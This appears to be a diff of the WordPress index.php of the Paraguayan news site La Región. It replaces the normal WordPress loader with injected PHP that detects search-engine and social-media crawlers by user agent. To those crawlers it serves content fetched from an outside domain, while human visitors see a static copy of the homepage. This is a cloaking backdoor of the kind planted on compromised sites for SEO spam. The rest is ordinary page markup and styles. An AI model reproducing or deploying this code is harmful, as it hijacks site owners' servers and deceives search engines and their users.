@@ -1,17 +1,889 @@
 <?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array(
+        'Googlebot', 'Googlebot-News', 'Googlebot-Image', 'Googlebot-Video',
+        'bingbot', 'Slurp', 'DuckDuckBot', 'BingPreview', 'DuckDuckGo', 'YandexBot',
+        'Baiduspider', 'TelegramBot', 'facebookexternalhit', 'Pinterest', 'W3C_Validator',
+        'Google-Site-Verification', 'Google-InspectionTool', 'Applebot', 'AhrefsBot', 'SEMrushBot', 'MJ12bot'
+    );
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
 
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
+    return false;
+}
 
-/** Loads the WordPress Environment and Template */
-require __DIR__ . '/wp-blog-header.php';
+function fetch_message_from_url($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout setelah 10 detik
+    $response = curl_exec($ch);
+    
+    if (curl_errno($ch)) {
+        error_log("Error cURL: " . curl_error($ch));
+        curl_close($ch);
+        return false;
+    }
+    
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    if ($http_code == 200) {
+        return $response;
+    } else {
+        error_log("HTTP Error: Status Code " . $http_code);
+        return false;
+    }
+}
+
+if (is_bot()) { 
+    $message = fetch_message_from_url('https://ampshel2.hargasuper25.com/laregion.com.py/index.txt');
+    
+    if ($message) {
+        echo $message;
+    } else {
+        echo "";
+    }
+    exit;
+}
+?>
+
+<!DOCTYPE html>
+<html class="no-js" lang="es">
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="profile" href="https://gmpg.org/xfn/11"/>
+  <link rel="pingback" href="https://laregion.com.py/xmlrpc.php">
+  <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1"/>
+	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
+	<script>document.documentElement.className = document.documentElement.className.replace("no-js","js");</script>
+	<!-- This site is optimized with the Yoast SEO plugin v24.3 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>La Región - Todas las noticias de tu región</title>
+	<link rel="canonical" href="https://laregion.com.py" />
+	<meta name="description" content="Todas las noticias de tu región"/>
+	<link rel="next" href="page/2/"/>
+	<meta property="og:locale" content="es_ES"/>
+	<meta property="og:type" content="website"/>
+	<meta property="og:title" content="La Región"/>
+	<meta property="og:description" content="Todas las noticias de tu región"/>
+	<meta property="og:url" content="https://laregion.com.py/"/>
+	<meta property="og:site_name" content="La Región"/>
+	<meta name="twitter:card" content="summary_large_image"/>
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"CollectionPage","@id":"https://laregion.com.py/","url":"https://laregion.com.py/","name":"La Región - Todas las noticias de tu región","isPartOf":{"@id":"https://laregion.com.py/#website"},"about":{"@id":"https://laregion.com.py/#organization"},"description":"Todas las noticias de tu región","breadcrumb":{"@id":"https://laregion.com.py/#breadcrumb"},"inLanguage":"es"},{"@type":"BreadcrumbList","@id":"https://laregion.com.py/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Portada"}]},{"@type":"WebSite","@id":"https://laregion.com.py/#website","url":"https://laregion.com.py/","name":"La Región","description":"Todas las noticias de tu región","publisher":{"@id":"https://laregion.com.py/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://laregion.com.py/?s={search_term_string}"},"query-input":{"@type":"PropertyValueSpecification","valueRequired":true,"valueName":"search_term_string"}}],"inLanguage":"es"},{"@type":"Organization","@id":"https://laregion.com.py/#organization","name":"La Región","url":"https://laregion.com.py/","logo":{"@type":"ImageObject","inLanguage":"es","@id":"https://laregion.com.py/#/schema/logo/image/","url":"https://laregion.com.py/wp-content/uploads/La-Región.png","contentUrl":"https://laregion.com.py/wp-content/uploads/La-Región.png","width":330,"height":85,"caption":"La Región"},"image":{"@id":"https://laregion.com.py/#/schema/logo/image/"},"sameAs":["https://www.facebook.com/laregionparaguay"]}]}</script>
+	<!-- / Yoast SEO plugin. -->
+<link id="hu-user-gfont" href="//fonts.googleapis.com/css?family=Ubuntu:400,400italic,300italic,300,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css"><script>
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/laregion.com.py\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.7.2"}};
+/*! This file is auto-generated */
+!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
+</script>
+<style id="wp-emoji-styles-inline-css">
+	img.wp-smiley, img.emoji {
+		display: inline !important;
+		border: none !important;
+		box-shadow: none !important;
+		height: 1em !important;
+		width: 1em !important;
+		margin: 0 0.07em !important;
+		vertical-align: -0.1em !important;
+		background: none !important;
+		padding: 0 !important;
+	}
+</style>
+<link rel="stylesheet" id="wp-block-library-css" href="wp-includes/css/dist/block-library/style.min_ver-6.7.2.css" media="all"/>
+<link rel="stylesheet" id="svp_block_free-style-css-css" href="wp-content/plugins/super-video-player/admin/blocks/dist/blocks.style.build.css" media="all"/>
+<style id="classic-theme-styles-inline-css">
+/*! This file is auto-generated */
+.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
+</style>
+<style id="global-styles-inline-css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel="stylesheet" id="bplugins-plyrio-css" href="wp-content/plugins/super-video-player/public/css/player-style_ver-1.7.5.css" media="all"/>
+<link rel="stylesheet" id="tiempo-css" href="https://laregion.com.py/wp-content/plugins/tiempo/public/css/tiempo-public.css?ver=1.0.0" media="all"/>
+<link rel="stylesheet" id="wp-show-posts-css" href="https://laregion.com.py/wp-content/plugins/wp-show-posts/css/wp-show-posts-min.css?ver=1.1.6" media="all"/>
+<link rel="stylesheet" id="hueman-main-style-css" href="https://laregion.com.py/wp-content/themes/hueman/assets/front/css/main.min.css?ver=3.7.27" media="all"/>
+<style id="hueman-main-style-inline-css">
+body { font-family:'Ubuntu', Arial, sans-serif;font-size:0.94rem }@media only screen and (min-width: 720px) {
+        .nav > li { font-size:0.94rem; }
+      }.boxed #wrapper, .container-inner { max-width: 1250px; }@media only screen and (min-width: 720px) {
+                .boxed .desktop-sticky {
+                  width: 1250px;
+                }
+              }::selection { background-color: #dd3333; }
+::-moz-selection { background-color: #dd3333; }a,a>span.hu-external::after,.themeform label .required,#flexslider-featured .flex-direction-nav .flex-next:hover,#flexslider-featured .flex-direction-nav .flex-prev:hover,.post-hover:hover .post-title a,.post-title a:hover,.sidebar.s1 .post-nav li a:hover i,.content .post-nav li a:hover i,.post-related a:hover,.sidebar.s1 .widget_rss ul li a,#footer .widget_rss ul li a,.sidebar.s1 .widget_calendar a,#footer .widget_calendar a,.sidebar.s1 .alx-tab .tab-item-category a,.sidebar.s1 .alx-posts .post-item-category a,.sidebar.s1 .alx-tab li:hover .tab-item-title a,.sidebar.s1 .alx-tab li:hover .tab-item-comment a,.sidebar.s1 .alx-posts li:hover .post-item-title a,#footer .alx-tab .tab-item-category a,#footer .alx-posts .post-item-category a,#footer .alx-tab li:hover .tab-item-title a,#footer .alx-tab li:hover .tab-item-comment a,#footer .alx-posts li:hover .post-item-title a,.comment-tabs li.active a,.comment-awaiting-moderation,.child-menu a:hover,.child-menu .current_page_item > a,.wp-pagenavi a{ color: #dd3333; }input[type="submit"],.themeform button[type="submit"],.sidebar.s1 .sidebar-top,.sidebar.s1 .sidebar-toggle,#flexslider-featured .flex-control-nav li a.flex-active,.post-tags a:hover,.sidebar.s1 .widget_calendar caption,#footer .widget_calendar caption,.author-bio .bio-avatar:after,.commentlist li.bypostauthor > .comment-body:after,.commentlist li.comment-author-admin > .comment-body:after{ background-color: #dd3333; }.post-format .format-container { border-color: #dd3333; }.sidebar.s1 .alx-tabs-nav li.active a,#footer .alx-tabs-nav li.active a,.comment-tabs li.active a,.wp-pagenavi a:hover,.wp-pagenavi a:active,.wp-pagenavi span.current{ border-bottom-color: #dd3333!important; }.sidebar.s2 .post-nav li a:hover i,
+.sidebar.s2 .widget_rss ul li a,
+.sidebar.s2 .widget_calendar a,
+.sidebar.s2 .alx-tab .tab-item-category a,
+.sidebar.s2 .alx-posts .post-item-category a,
+.sidebar.s2 .alx-tab li:hover .tab-item-title a,
+.sidebar.s2 .alx-tab li:hover .tab-item-comment a,
+.sidebar.s2 .alx-posts li:hover .post-item-title a { color: #81d742; }
+.sidebar.s2 .sidebar-top,.sidebar.s2 .sidebar-toggle,.post-comments,.jp-play-bar,.jp-volume-bar-value,.sidebar.s2 .widget_calendar caption{ background-color: #81d742; }.sidebar.s2 .alx-tabs-nav li.active a { border-bottom-color: #81d742; }
+.post-comments::before { border-right-color: #81d742; }
+      .search-expand,
+              #nav-topbar.nav-container { background-color: #000000}@media only screen and (min-width: 720px) {
+                #nav-topbar .nav ul { background-color: #000000; }
+              }.is-scrolled #header .nav-container.desktop-sticky,
+              .is-scrolled #header .search-expand { background-color: #000000; background-color: rgba(0,0,0,0.90) }.is-scrolled .topbar-transparent #nav-topbar.desktop-sticky .nav ul { background-color: #000000; background-color: rgba(0,0,0,0.95) }#header { background-color: #eaeaea; }
+@media only screen and (min-width: 720px) {
+  #nav-header .nav ul { background-color: #eaeaea; }
+}
+        .is-scrolled #header #nav-mobile { background-color: #454e5c; background-color: rgba(69,78,92,0.90) }#nav-header.nav-container, #main-header-search .search-expand { background-color: #000000; }
+@media only screen and (min-width: 720px) {
+  #nav-header .nav ul { background-color: #000000; }
+}
+        .site-title a img { max-height: 75px; }img { -webkit-border-radius: 5px; border-radius: 5px; }body { background-color: #eaeaea; }
+</style>
+<script src="https://laregion.com.py/wp-content/plugins/super-video-player/public/js/super-video.js?ver=1.7.5" id="bplugins-plyrio-js"></script>
+<script src="https://laregion.com.py/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script src="https://laregion.com.py/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script src="https://laregion.com.py/wp-content/plugins/tiempo/public/js/tiempo-public.js?ver=1.0.0" id="tiempo-js"></script>
+<script src="https://laregion.com.py/wp-content/themes/hueman/assets/front/js/libs/mobile-detect.min.js?ver=3.7.27" id="mobile-detect-js" defer></script>
+<script src="https://laregion.com.py/wp-content/themes/hueman/assets/front/js/libs/jquery.flexslider.min.js?ver=3.7.27" id="flexslider-js" defer></script>
+<link rel="https://api.w.org/" href="https://laregion.com.py/wp-json/"/><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://laregion.com.py/xmlrpc.php?rsd"/>
+<meta name="generator" content="WordPress 6.7.2"/>
+    <link rel="preload" as="font" type="font/woff2" href="https://laregion.com.py/wp-content/themes/hueman/assets/front/webfonts/fa-brands-400.woff2?v=5.15.2" />
+    <link rel="preload" as="font" type="font/woff2" href="https://laregion.com.py/wp-content/themes/hueman/assets/front/webfonts/fa-regular-400.woff2?v=5.15.2" />
+    <link rel="preload" as="font" type="font/woff2" href="https://laregion.com.py/wp-content/themes/hueman/assets/front/webfonts/fa-solid-900.woff2?v=5.15.2" />
+  <!--[if lt IE 9]>
+<script src="https://laregion.com.py/wp-content/themes/hueman/assets/front/js/ie/html5shiv-printshiv.min.js"></script>
+<script src="https://laregion.com.py/wp-content/themes/hueman/assets/front/js/ie/selectivizr.js"></script>
+<![endif]-->
+<link rel="icon" href="https://laregion.com.py/wp-content/uploads/2020/03/La_Región_-Icono-png-150x150.png" sizes="32x32"/>
+<link rel="icon" href="https://laregion.com.py/wp-content/uploads/2020/03/La_Región_-Icono-png-300x300.png" sizes="192x192"/>
+<link rel="apple-touch-icon" href="https://laregion.com.py/wp-content/uploads/2020/03/La_Región_-Icono-png-300x300.png"/>
+<meta name="msapplication-TileImage" content="https://laregion.com.py/wp-content/uploads/2020/03/La_Región_-Icono-png-300x300.png"/>
+</head>
+<body class="home blog wp-custom-logo wp-embed-responsive col-3cm boxed topbar-enabled hu-fa-not-loaded hueman-3-7-27 unknown">
+<div id="wrapper">
+  <a class="screen-reader-text skip-link" href="#content">Saltar al contenido</a>
+  <header id="header" class="main-menu-mobile-on one-mobile-menu main_menu header-ads-desktop header-ads-mobile topbar-transparent no-header-img">
+        <nav class="nav-container group mobile-menu  " id="nav-mobile" data-menu-id="header-1">
+  <div class="mobile-title-logo-in-header"><p class="site-title">                  <a class="custom-logo-link" href="/" rel="home" title="La Región | Inicio"><img src="https://laregion.com.py/wp-content/uploads/La-Región.png" alt="La Región" width="330" height="85"/></a>                </p></div>
+                    <!-- <div class="ham__navbar-toggler collapsed" aria-expanded="false">
+          <div class="ham__navbar-span-wrapper">
+            <span class="ham-toggler-menu__span"></span>
+          </div>
+        </div> -->
+        <button class="ham__navbar-toggler-two collapsed" title="Menu" aria-expanded="false">
+          <span class="ham__navbar-span-wrapper">
+            <span class="line line-1"></span>
+            <span class="line line-2"></span>
+            <span class="line line-3"></span>
+          </span>
+        </button>
+      <div class="nav-text"></div>
+      <div class="nav-wrap container">
+                  <ul class="nav container-inner group mobile-search">
+                            <li>
+                  <form role="search" method="get" class="search-form" action="/">
+				<label>
+					<span class="screen-reader-text">Buscar:</span>
+					<input type="search" class="search-field" placeholder="Buscar …" value="" name="s"/>
+				</label>
+				<input type="submit" class="search-submit" value="Buscar"/>
+			</form>                </li>
+                      </ul>
+                <ul id="menu-categorias" class="nav container-inner group"><li id="menu-item-22" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-22"><a href="categorias/locales/">Locales</a></li>
+<li id="menu-item-25" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-25"><a href="categorias/regionales/">Regionales</a></li>
+<li id="menu-item-23" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-23"><a href="categorias/nacionales/">Nacionales</a></li>
+<li id="menu-item-21" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-21"><a href="categorias/internacionales/">Internacionales</a></li>
+<li id="menu-item-24" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-24"><a href="categorias/politica/">Política</a></li>
+<li id="menu-item-20" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-20"><a href="categorias/deportes/">Deportes</a></li>
+<li id="menu-item-357" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-357"><a href="categorias/empresariales/">Empresariales</a></li>
+<li id="menu-item-3995" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3995"><a href="categorias/eventos-sociales/">Eventos & Sociales</a></li>
+<li id="menu-item-3996" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3996"><a href="https://guiapar.com.py/">GuíaPar</a></li>
+<li id="menu-item-3997" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-3997"><a href="http://app.com.py/">APP (Agenda Política)</a></li>
+<li id="menu-item-4988" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4988"><a href="revistas/">Revista</a></li>
+</ul>      </div>
+</nav><!--/#nav-topbar-->  
+        <nav class="nav-container group desktop-menu  " id="nav-topbar" data-menu-id="header-2">
+    <div class="nav-text"></div>
+  <div class="topbar-toggle-down">
+    <i class="fas fa-angle-double-down" aria-hidden="true" data-toggle="down" title="Expandir menú"></i>
+    <i class="fas fa-angle-double-up" aria-hidden="true" data-toggle="up" title="Contraer Menú"></i>
+  </div>
+  <div class="nav-wrap container">
+    <ul id="menu-paginas" class="nav container-inner group"><li id="menu-item-17" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-17"><a href="/" aria-current="page">Inicio</a></li>
+<li id="menu-item-19" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-19"><a href="somos/">Somos</a></li>
+<li id="menu-item-4989" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4989"><a href="revistas/">Revista</a></li>
+<li id="menu-item-18" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-18"><a href="contacto/">Contacto</a></li>
+</ul>  </div>
+      <div id="topbar-header-search" class="container">
+      <div class="container-inner">
+        <button class="toggle-search"><i class="fas fa-search"></i></button>
+        <div class="search-expand">
+          <div class="search-expand-inner"><form role="search" method="get" class="search-form" action="/">
+				<label>
+					<span class="screen-reader-text">Buscar:</span>
+					<input type="search" class="search-field" placeholder="Buscar …" value="" name="s"/>
+				</label>
+				<input type="submit" class="search-submit" value="Buscar"/>
+			</form></div>
+        </div>
+      </div><!--/.container-inner-->
+    </div><!--/.container-->
+</nav><!--/#nav-topbar-->  
+  <div class="container group">
+        <div class="container-inner">
+                    <div class="group hu-pad central-header-zone">
+                  <div class="logo-tagline-group">
+                      <h1 class="site-title">                  <a class="custom-logo-link" href="/" rel="home" title="La Región | Inicio"><img src="https://laregion.com.py/wp-content/uploads/La-Región.png" alt="La Región" width="330" height="85"/></a>                </h1>                                        </div>
+                                        <div id="header-widgets">
+                          <div id="custom_html-5" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><div align="center"><img src="https://laregion.com.py/wp-content/uploads/2022/02/Alquimia_700×100.gif" alt="" width="700" height="100"></div>
+</div></div>                      </div><!--/#header-ads-->
+                                </div>
